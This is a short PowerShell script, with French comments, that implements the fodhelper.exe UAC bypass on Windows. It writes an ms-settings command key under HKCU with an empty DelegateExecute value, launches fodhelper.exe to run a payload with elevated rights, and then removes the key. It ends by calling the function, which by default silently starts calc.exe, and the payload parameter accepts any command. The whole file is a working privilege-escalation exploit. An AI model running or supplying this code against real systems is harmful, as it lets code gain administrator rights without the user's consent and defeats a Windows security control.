function Invoke-FodhelperBypass {
    param(
        [string]$payload = "powershell -windowstyle hidden -Command `"Start-Process calc.exe`""
    )

    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    try {
        New-Item -Path $regPath -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "DelegateExecute" -PropertyType String -Value "" | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload

        Write-Host "[+] Bypass ready, launching fodhelper.exe..."
        Start-Process "fodhelper.exe"

        Start-Sleep -Seconds 4
    }
    catch {
        Write-Warning "[-] Erreur pendant le bypass : $_"
    }
    finally {
        Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Nettoyage terminé (registre)"
    }
}

# EXEMPLE : lance calc.exe élevé
Invoke-FodhelperBypass
